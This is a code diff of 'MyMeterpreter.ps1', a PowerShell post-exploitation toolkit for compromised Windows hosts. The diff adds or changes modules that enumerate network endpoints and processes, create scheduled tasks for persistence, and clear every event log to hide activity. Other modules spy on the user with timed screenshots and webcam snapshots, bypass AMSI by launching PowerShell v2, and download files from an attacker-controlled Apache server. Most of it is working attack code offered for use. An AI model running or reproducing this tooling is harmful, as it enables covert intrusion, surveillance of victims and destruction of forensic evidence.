+      List the TCP endpoints on the local machine. For each entry in the table,
+      a custom PS object is returned, indicating the IP version, the protocol (TCP),
+      the local address, the state, the PID of the associated process and the name of the
+      process. The process name is retrieved through a call to "Get-Process -PID <PID>".
+    
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
+
+   .OUTPUTS
+      IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
+      --   ----- ------------ --------- --------         -----       --- ----
+      IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
+      IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
+      IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
+      IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
    #>
 
-   Write-Host "  $Remote_hostName Active TCP Connections" -ForegroundColor Green
-   Write-Host "  -----------------------------`n";Start-Sleep -Seconds 1
-   Write-Host "  Proto  Local                  Remote                 Status          PID"
-   Write-Host "  -----  -----                  ------                 ------          ---"
-   cmd.exe /c netstat -ano|findstr /C:"ESTABLISHED"|findstr /V "["
-   Write-Host "";Start-Sleep -Seconds 1
+## Win32 Functions
+$CSharpSource = @'
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCPROW_OWNER_PID
+{
+    public uint state;
+    public uint localAddr;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] localPort;
+    public uint remoteAddr;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] remotePort;
+    public uint owningPid;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCP6ROW_OWNER_PID
+{
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+    public byte[] localAddr;
+    public uint localScopeId;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] localPort;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+    public byte[] remoteAddr;
+    public uint remoteScopeId;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] remotePort;
+    public uint state;
+    public uint owningPid;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCPTABLE_OWNER_PID
+{
+    public uint dwNumEntries;
+    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
+    public MIB_TCPROW_OWNER_PID[] table;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCP6TABLE_OWNER_PID
+{
+    public uint dwNumEntries;
+    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
+    public MIB_TCP6ROW_OWNER_PID[] table;
+}
+[DllImport("iphlpapi.dll", SetLastError=true)]
+public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
+[DllImport("iphlpapi.dll", SetLastError=true)]
+public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
+'@
+
+try {
+    ## Is the Type already defined?
+    [eopCheck.Win32]|Out-Null 
+}catch{
+    ## If not, create it by compiling the C# code in memory 
+    $CompilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
+    $CompilerParameters.GenerateInMemory = $True
+    $CompilerParameters.GenerateExecutable = $False 
+    Add-Type -MemberDefinition $CSharpSource -Name 'Win32' -Namespace 'eopCheck' -Language CSharp -CompilerParameters $CompilerParameters
+}
+
+
+function Get-NetworkEndpoints {
+
+$AF_INET6 = 23
+$AF_INET = 2
+    
+   If($IPv6){ 
+      $IpVersion = $AF_INET6
+   }Else{
+      $IpVersion = $AF_INET
+   }
+
+   $TCP_TABLE_OWNER_PID_LISTENER = 3
+   [int]$BufSize = 0
+   $Result = [eopCheck.Win32]::GetExtendedTcpTable([IntPtr]::Zero, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
+   $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+   If($Result -eq 122){
+      Write-Verbose "GetExtendedProtoTable() OK - Size: $BufSize"
+      [IntPtr]$TablePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufSize)
+      $Result = [eopCheck.Win32]::GetExtendedTcpTable($TablePtr, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
+      $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+      If($Result -eq 0){
+         If($IpVersion -eq $AF_INET){ 
+            $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [eopCheck.Win32+MIB_TCPTABLE_OWNER_PID])
+         }ElseIf($IpVersion -eq $AF_INET6){ 
+            $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [eopCheck.Win32+MIB_TCP6TABLE_OWNER_PID])
+         }
+       
+         $NumEntries = $Table.dwNumEntries
+         Write-Verbose "GetExtendedProtoTable() OK - NumEntries: $NumEntries"
+         $Offset = [IntPtr] ($TablePtr.ToInt64() + 4)
+
+         For($i = 0; $i -lt $NumEntries; $i++){
+
+            If($IpVersion -eq $AF_INET){
+               $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [eopCheck.Win32+MIB_TCPROW_OWNER_PID])
+               $LocalAddr = (New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr)).IPAddressToString
+            }ElseIf($IpVersion -eq $AF_INET6){
+               $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [eopCheck.Win32+MIB_TCP6ROW_OWNER_PID])
+               $LocalAddr = New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr, $TableEntry.localScopeId)
+            }
+
+            $LocalPort = $TableEntry.localPort[0] * 0x100 + $TableEntry.localPort[1]
+            $ProcessId = $TableEntry.owningPid
+
+            If($IpVersion -eq $AF_INET){
+               $LocalAddress = "$($LocalAddr):$($LocalPort)"
+            }ElseIf($IpVersion -eq $AF_INET6){
+               $LocalAddress = "[$($LocalAddr)]:$($LocalPort)"
+            }
+
+            $ListenerObject = New-Object -TypeName PSObject 
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $(if ($IpVersion -eq $AF_INET) { "IPv4" } else { "IPv6" } )
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $(if ($UDP) { "UDP" } else { "TCP" } )
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $LocalAddr
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalPort" -Value $LocalPort
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Endpoint" -Value $LocalAddress
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($UDP) { "N/A" } else { "LISTENING" } )
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $ProcessId
+            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value (Get-Process -PID $ProcessId).ProcessName
+            $ListenerObject
+
+            $Offset = [IntPtr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($TableEntry))
+         }
+
+        }Else{
+           Write-Verbose ([ComponentModel.Win32Exception] $LastError)
+        }
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TablePtr)
+    }Else{
+       Write-Verbose ([ComponentModel.Win32Exception] $LastError)
+    }
+}
+Get-NetworkEndpoints|ft
 }
 
 If($GetInstalled -ieq "Enum"){
 
    <#
    .SYNOPSIS
-     Helper - List Remote Host Applications installed
+     Helper - List remote host applications installed
+
+   .DESCRIPTION
+      Enumerates appl installed and respective versions
 
    .EXAMPLE
       PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
+
+   .OUTPUTS
+      DisplayName                   DisplayVersion     
+      -----------                   --------------     
+      Adobe Flash Player 32 NPAPI   32.0.0.314         
+      ASUS GIFTBOX                  7.5.24
    #>
 
    Write-Host "$Remote_hostName Applications installed" -ForegroundColor Green
@@ -363,19 +724,34 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
 
    <#
    .SYNOPSIS
-     Helper - Enumerate/Kill Running Process
+     Helper - Enumerate/Kill running process
+
+   .DESCRIPTION
+      This CmdLet enumerates 'All' running process if used
+      only the 'Enum' @arg IF used -ProcessName parameter
+      then cmdlet 'kill' or 'enum' the sellected processName.
 
    .EXAMPLE
       PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum
-      Enumerate Remote Host Running Process(s)
+      Enumerate ALL Remote Host Running Process(s)
 
    .EXAMPLE
       PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
-      Enumerate Remote Host firefox.exe Process(s)
+      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}
 
    .EXAMPLE
       PC C:\> .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
       Kill Remote Host firefox.exe Running Process
+
+   .OUTPUTS
+      Id              : 8564
+      Name            : ApplicationFrameHost
+      Path            : C:\WINDOWS\system32\ApplicationFrameHost.exe
+      Company         : Microsoft Corporation
+      FileVersion     : 10.0.18362.1316 (WinBuild.160101.0800)
+      MainWindowTitle : Calculadora
+      StartTime       : 23/01/2021 16:01:47
+      Responding      : True
    #>
 
    ## Syntax Examples
@@ -385,15 +761,17 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
    Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName notepad.exe`n"
    Start-Sleep -Seconds 2
 
+
    If($GetProcess -ieq "Enum" -and $ProcessName -ieq "false"){## Enumerate ALL running process(s)
       Write-Host "$Remote_hostName Running Process" -ForegroundColor Green
       Write-Host "----------------------";Start-Sleep -Seconds 1
-      Get-Process -EA SilentlyContinue|Select-Object Name,Path,Company,StartTime,Responding|Where-Object { $_.Responding -Match "True" -and $_.StartTime -ne $null}
+      Get-Process -EA SilentlyContinue|Select-Object Id,Name,Path,Company,FileVersion,mainwindowtitle,StartTime,Responding|Where-Object { $_.Responding -Match "True" -and $_.StartTime -ne $null}
    }ElseIf($GetProcess -ieq "Enum" -and $ProcessName -ne "false"){## Enumerate User Inpur ProcessName
       $RawProcName = $ProcessName -replace '.exe','' ## Replace .exe in processname to be abble use Get-Process
       Write-Host "$Remote_hostName $ProcessName Process" -ForegroundColor Green
       Write-Host "---------------------------";Start-Sleep -Seconds 1
-      $CheckProc = Get-Process $RawProcName -EA SilentlyContinue|Select-Object Id,Name,Description,ProductVersion,Path,Company,StartTime,HasExited,Responding
+
+      $CheckProc = Get-Process $RawProcName -EA SilentlyContinue|Select-Object Id,Name,Description,mainwindowtitle,ProductVersion,Path,Company,StartTime,HasExited,Responding
       If(-not($CheckProc)){## User Input => ProcessName NOT found
          Write-Host "[error] $ProcessName NOT found running!" -ForegroundColor Red -BackgroundColor Black
          Start-Sleep -Seconds 1
@@ -406,7 +784,6 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
    }ElseIf($GetProcess -ieq "Kill"){## Kill User Input => Running Process
       If($ProcessName -ieq $null -or $ProcessName -ieq "false"){## Make sure ProcessName Mandatory argument its set
         Write-Host "[error] -ProcessName Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
-        Write-Host "syntax: .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe"
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
       }
 
@@ -415,9 +792,9 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
       $MSPIR = (Get-Process $RawProcName -EA SilentlyContinue).Responding|Select-Object -First 1
       If($MSPIR -ieq "True"){## ProcessName found => Responding
          If(-not($ProcessName -Match "[.exe]$")){## Add extension required (.exe) by taskkill cmdline
-            $ProcessName = "$ProcessName"+".exe" -join ''
+            $ProcessName = "$ProcessName" + ".exe" -join ''
          }
-         cmd.exe /R taskkill /F /IM $ProcessName
+         cmd /R taskkill /F /IM $ProcessName
       }Else{## ProcessName NOT found responding
          Write-Host "[error] $ProcessName Process Name NOT found!" -ForegroundColor Red -BackgroundColor Black
          Start-Sleep -Seconds 1
@@ -426,26 +803,197 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
    Write-Host "";Start-Sleep -Seconds 1
 }
 
-If($GetTasks -ieq "Enum"){
+If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"){
 
    <#
    .SYNOPSIS
-     Helper - Enumerate Remote Host Running Tasks
+     Helper - Enumerate\Create\Delete running tasks
+
+   .DESCRIPTION
+      This module enumerates remote host running tasks
+      Or creates a new task Or deletes existence tasks
+
+   .NOTES
+      Required Dependencies: cmd|schtasks {native}
+      Remark: Module parameters are auto-set {default}
+      Remark: Tasks have the default duration of 9 hours.
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create
+      Use module default settings to create the demo task
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
+      Deletes mytask taskname
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
+
+   .OUTPUTS
+      TaskName                                 Next Run Time          Status
+      --------                                 -------------          ------
+      ASUS Smart Gesture Launcher              N/A                    Ready          
+      CreateExplorerShellUnelevatedTask        N/A                    Ready          
+      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready   
    #>
 
-   Write-Host "$Remote_hostName Running Tasks" -ForegroundColor Green
-   Write-Host "-------------------`n"
-   Start-Sleep -Seconds 1
-   Write-Host "TaskName                                 Next Run Time          Status"
-   Write-Host "--------                                 -------------          ------"
-   cmd.exe /R schtasks|findstr /I "Ready Running"
+   ## Select the type of module to run
+   If($GetTasks -ieq "Enum"){## Enum All running tasks
+
+      Write-Host "$Remote_hostName\$Env:USERNAME Running Tasks" -ForegroundColor Green
+      Write-Host "--------------------------`n"
+      Start-Sleep -Seconds 1
+      Write-Host "TaskName                                 Next Run Time          Status"
+      Write-Host "--------                                 -------------          ------"
+      cmd.exe /R schtasks|findstr /I "Ready Running"
+      Write-Host "";Start-Sleep -Seconds 1
+
+   }ElseIf($GetTasks -ieq "Create"){## Create a new tak
+
+      If($Exec -ieq "false" -or $Exec -ieq $null){
+         $Exec = "cmd /c start calc.exe" ## Default Command to Execute
+      }
+
+      $Task_duration = "000" + "9" + ":00" ## 9 Hours of Task Duration
+      cmd /R schtasks /Create /sc minute /mo "$Interval" /tn "$TaskName" /tr "$Exec" /du "$Task_duration"
+      Write-Host "";schtasks /Query /tn "$TaskName" #/v /fo list
+
+   }ElseIf($GetTasks -ieq "Delete"){## Deletes existing task
+
+      cmd /R schtasks /Delete /tn "$TaskName" /f
+
+   }
+   Write-Host "`n"
+   If(Test-Path -Path "$Env:TMP\schedule.txt"){Remove-Item -Path "$Env:TMP\schedule.txt" -Force}
+}
+
+If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Clear" -or $GetLogs -ieq "Verbose"){
+If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs to display
+
+   <#
+   .SYNOPSIS
+      Helper - Enumerate eventvwr logs OR Clear All event logs
+
+   .NOTES
+      Required Dependencies: wevtutil {native}
+      The Clear @argument requires Administrator privs
+      on shell to be abble to 'Clear' Eventvwr entrys.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Enum
+      Lists ALL eventvwr categorie entrys
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose
+      List the newest 10(default) Powershell\Application\System entrys
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
+      List the newest 28 Eventvwr Powershell\Application\System entrys
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Clear
+      Remark: Clear @arg requires Administrator privs on shell
+
+   .OUTPUTS
+      Max(K) Retain OverflowAction    Entries Log                   
+      ------ ------ --------------    ------- ---                            
+      20 480      0 OverwriteAsNeeded   1 024 Application           
+      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
+      20 480      0 OverwriteAsNeeded      74 System                
+      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
+   #>
+
+   If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Verbose"){## Eventvwr Enumeration
+      ## List ALL Event Logs
+      Get-EventLog -List|Format-Table -AutoSize
+
+      If($GetLogs -ieq "Verbose"){## verbose @argument function
+
+         ## Local function Variable declarations {Powershell}
+         $SysLogCatg = wevtutil gl "Windows Powershell"|findstr /I /C:"name"
+         $SysLogCatg = $SysLogCatg|findstr /V "logFileName:"
+         $SysLogType = wevtutil gl "Windows Powershell"|findstr /I "type"
+         $SysLogStat = wevtutil gl "Windows Powershell"|findstr /I "enabled"
+         $SysLogFile = wevtutil gl "Windows Powershell"|findstr /I "logFileName"
+         $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string
+
+         ## List last 10 Powershell eventlogs
+         Write-Host "`n  $SysLogCatg" -ForegroundColor Green
+         Write-Host "  $SysLogType" -ForegroundColor Yellow
+         Write-Host "  $SysLogStat" -ForegroundColor Yellow
+         $Log = Get-EventLog -LogName "Windows Powershell" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType
+         If($? -ieq $False){## $LASTEXITCODE return $False => None Logs present
+            Write-Host "  $SysLogFile" -ForegroundColor Yellow
+            Write-Host "  [error] None Eventvwr Entries found under Windows Powershell!`n" -ForegroundColor Red -BackgroundColor Black
+         }Else{## $LASTEXITCODE return $True => Logs present
+            Write-Host "  $SysLogFile`n" -ForegroundColor Yellow
+            Get-EventLog -LogName "Windows Powershell" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType,Source,Message|Format-Table -AutoSize
+         }
+
+
+         ## Local function Variable declarations {Application}
+         $SysLogCatg = wevtutil gl "Application"|findstr /I /C:"name"
+         $SysLogCatg = $SysLogCatg|findstr /V "logFileName:"
+         $SysLogType = wevtutil gl "Application"|findstr /I "type"
+         $SysLogStat = wevtutil gl "Application"|findstr /I "enabled"
+         $SysLogFile = wevtutil gl "Application"|findstr /I "logFileName"
+         $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string
+
+         ## List last 10 Application eventlogs
+         Write-Host "`n  $SysLogCatg" -ForegroundColor Green
+         Write-Host "  $SysLogType" -ForegroundColor Yellow
+         Write-Host "  $SysLogStat" -ForegroundColor Yellow
+         $Log = Get-EventLog -LogName "Application" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType
+         If($? -ieq $False){## $LASTEXITCODE return $False => None Logs present
+            Write-Host "  $SysLogFile" -ForegroundColor Yellow
+            Write-Host "  [error] None Eventvwr Entries found under Application!`n" -ForegroundColor Red -BackgroundColor Black
+         }Else{## $LASTEXITCODE return $True => Logs present
+            Write-Host "  $SysLogFile`n" -ForegroundColor Yellow
+            Get-EventLog -LogName "Application" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType,Source,Message|Format-Table -AutoSize
+         }
+
+
+         ## Local function Variable declarations {System}
+         $SysLogCatg = wevtutil gl System|findstr /I /C:"name"
+         $SysLogCatg = $SysLogCatg|findstr /V "logFileName:"
+         $SysLogType = wevtutil gl System|findstr /I "type"
+         $SysLogStat = wevtutil gl System|findstr /I "enabled"
+         $SysLogFile = wevtutil gl System|findstr /I "logFileName"
+         $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string
+
+         ## List last 10 System eventlogs
+         Write-Host "`n  $SysLogCatg" -ForegroundColor Green
+         Write-Host "  $SysLogType" -ForegroundColor Yellow
+         Write-Host "  $SysLogStat" -ForegroundColor Yellow
+         $Log = Get-EventLog -LogName "System" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType
+         If($? -ieq $False){## $LASTEXITCODE return $False => None Logs present
+            Write-Host "  $SysLogFile" -ForegroundColor Yellow
+            Write-Host "  [error] None Eventvwr Entries found under System!`n" -ForegroundColor Red -BackgroundColor Black
+         }Else{## $LASTEXITCODE return $True => Logs present
+            Write-Host "  $SysLogFile`n" -ForegroundColor Yellow
+            Get-EventLog -LogName "System" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType,Source,Message|Format-Table -AutoSize
+         }
+      }
+
+   }ElseIf($GetLogs -ieq "Clear"){## Clear ALL Eventvwr Logs
+      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
+      If(-not($IsClientAdmin)){## wevtutil cl => requires Administrator rigths to run
+         Write-Host "[error] This module requires 'Administrator' rigths to run!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
+      }
+      ## Clear ALL event Logs
+      Write-Host "[i] Administrator Privileges: True" -ForegroundColor Yellow
+      Write-Host "[+] Cleaning $Remote_hostName\$Env:USERNAME Eventvwr logs ...`n" -ForeGroundColor Green
+      wevtutil el|Foreach-Object {wevtutil cl "$_"}
+   }
    Write-Host "";Start-Sleep -Seconds 1
 }
 
-If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "ScanAll"){
+If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
 
    <#
    .SYNOPSIS
@@ -461,8 +1009,15 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "ScanAll"){
       Identify installed browsers and versions
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers ScanAll
+      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Verbose
       Run enumeration modules againts ALL installed browsers
+
+   .OUTPUTS
+      Browser   Install   Status   Version         PreDefined
+      -------   -------   ------   -------         ----------
+      IE        Found     Stoped   9.11.18362.0    False
+      CHROME    False     Stoped   {null}          False
+      FIREFOX   Found     Active   81.0.2          True
    #>
 
    If(-not(Test-Path -Path "$Env:TMP\GetBrowsers.ps1")){## Download GetBrowsers.ps1 from my GitHub repository
@@ -487,7 +1042,7 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "ScanAll"){
    ## Run sellect modules againts installed browsers
    If($GetBrowsers -ieq "Enum"){## [ Enum ] @arg scans
       &"$Env:TMP\GetBrowsers.ps1" -RECON
-   }Else{## [ ScanAll ] @arg scans
+   }Else{## [ Verbose ] @arg scans
 
       &"$Env:TMP\GetBrowsers.ps1" -RECON
       If($IEfound -ieq "Installed"){## IExplorer Found
@@ -520,19 +1075,28 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "ScanAll"){
 
 If($Screenshot -gt 0){
 $Limmit = $Screenshot+1 ## The number of screenshots to be taken
-If($Delay -lt '1'){$Delay = '1'} ## Screenshots delay time minimum value accepted
+If($Delay -lt '1' -or $Delay -gt '180'){$Delay = '1'} ## Screenshots delay time max\min value accepted
 
    <#
    .SYNOPSIS
-      Helper - Capture Remote Desktop Screenshot(s)
+      Helper - Capture remote desktop screenshot(s)
+
+   .DESCRIPTION
+      This module can be used to take only one screenshot
+      or to spy target user activity using -Delay parameter.
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
       Capture 1 desktop screenshot and store it on %TMP%.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 2
-      Capture 5 desktop screenshots with 2 secs delay between captures.
+      PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 8
+      Capture 5 desktop screenshots with 8 secs delay between captures.
+
+   .OUTPUTS
+      ScreenCaptures Delay  Storage                          
+      -------------- -----  -------                          
+      1              1(sec) C:\Users\pedro\AppData\Local\Temp
    #>
 
    ## Syntax Examples
@@ -573,7 +1137,7 @@ If($Delay -lt '1'){$Delay = '1'} ## Screenshots delay time minimum value accepte
       $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
       $Console.Save($FileName) 
 
-      Write-Host "$num Saved: $FileName" -ForegroundColor Yellow
+      Write-Host "$num - Saved: $FileName" -ForegroundColor Yellow
       Start-Sleep -Seconds $Delay; ## 2 seconds delay between screenshots (default value)
    }
    Write-Host "";Start-Sleep -Seconds 1
@@ -583,7 +1147,7 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
 
    <#
    .SYNOPSIS
-      List computer cameras or capture camera screenshot
+      Helper - List computer cameras or capture camera screenshot
 
    .NOTES
       Remark: WebCam turns the ligth ON taking snapshots.
@@ -594,11 +1158,16 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -Camera Enum
-      List WebCams Device Names available
+      List ALL WebCams Device Names available
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -Camera Snap
       Take one screenshot using default camera
+
+   .OUTPUTS
+      StartTime ProcessName DeviceName           
+      --------- ----------- ----------           
+      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
    #>
 
    ## Download CommandCam binary if not exist
@@ -614,7 +1183,7 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
    }
 
 
-   If($Camera -ieq "Enum"){
+   If($Camera -ieq "Enum"){## Enumerate All WebCam devices
 
       ## AMSI Bypass execution function
       $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
@@ -655,9 +1224,7 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
       Get-Content -Path "$Env:TMP\KeyDump.log"
       Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
 
-
    }ElseIf($Camera -ieq "Snap"){## Take SnapShot with default Camera
-
 
       ## AMSI Bypass execution function
       $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
@@ -668,8 +1235,8 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
          cd $Working_Directory ## Return to @MyMeterpreter Working Directory
       }Else{## Remote Host without PS v2 available
          cd $Env:TMP
-         $SnapTimer = Get-Date -Format 'HH:mm:ss'
          .\CommandCam.exe /quiet
+         $SnapTimer = Get-Date -Format 'HH:mm:ss'
          cd $Working_Directory ## Return to @MyMeterpreter Working Directory
       }
 
@@ -769,12 +1336,12 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
       If($IsClientAdmin){## Start-WebServer requires Administrator rigths to run
          If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
             Write-Host "[+] Task      : Downloading Start-WebServer.ps1 from github" -ForegroundColor Green
-            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/Start-WebServer.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null   
+            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/Start-Webserver.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
          }
 
          ## Check downloaded file integrity
          $SizeDump = ((Get-Item -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue).length/1KB)
-         If($SizeDump -lt 25){## Corrupted download detected => DefaultFileSize: 25,4453125/KB
+         If($SizeDump -lt 24){## Corrupted download detected => DefaultFileSize: 24,7763671875/KB
             Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
             If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1"){Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force}
          }Else{
@@ -795,6 +1362,7 @@ If($Upload -ne "false"){
       Helper - Download Files from Attacker Apache2 (BitsTransfer)
 
    .NOTES
+      Required Dependencies: BitsTransfer {native}
       File to Download must be stored in attacker apache2 webroot.
       -Upload and -ApacheAddr Are Mandatory parameters (required).
       -Destination parameter its auto set to $Env:TMP by default.
@@ -806,14 +1374,13 @@ If($Upload -ne "false"){
 
    ## Syntax Examples
    Write-Host "Syntax Examples" -ForegroundColor Green
+   Write-Host "syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]"
    Write-Host "Example: .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1`n"
    Start-Sleep -Seconds 2
 
    ## Make sure we have all parameters required
    If($ApacheAddr -ieq "false" -or $ApacheAddr -ieq $null){## Mandatory parameter
-      Write-Host "[error]: [ -ApacheAddr ] Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker-Apache ] -Destination [ Path\file.ps1 ]"
-      Write-Host "example: .\MyMeterpreter.ps1 -Upload $Upload -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\$Upload"
+      Write-Host "[error]: -ApacheAddr Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
    }
    If($Destination -ieq "false" -or $Destination -ieq $null){## [ -Destination ] parameter $null
@@ -833,9 +1400,7 @@ If($Upload -ne "false"){
 
    ## Make sure that file was successfuly downloaded
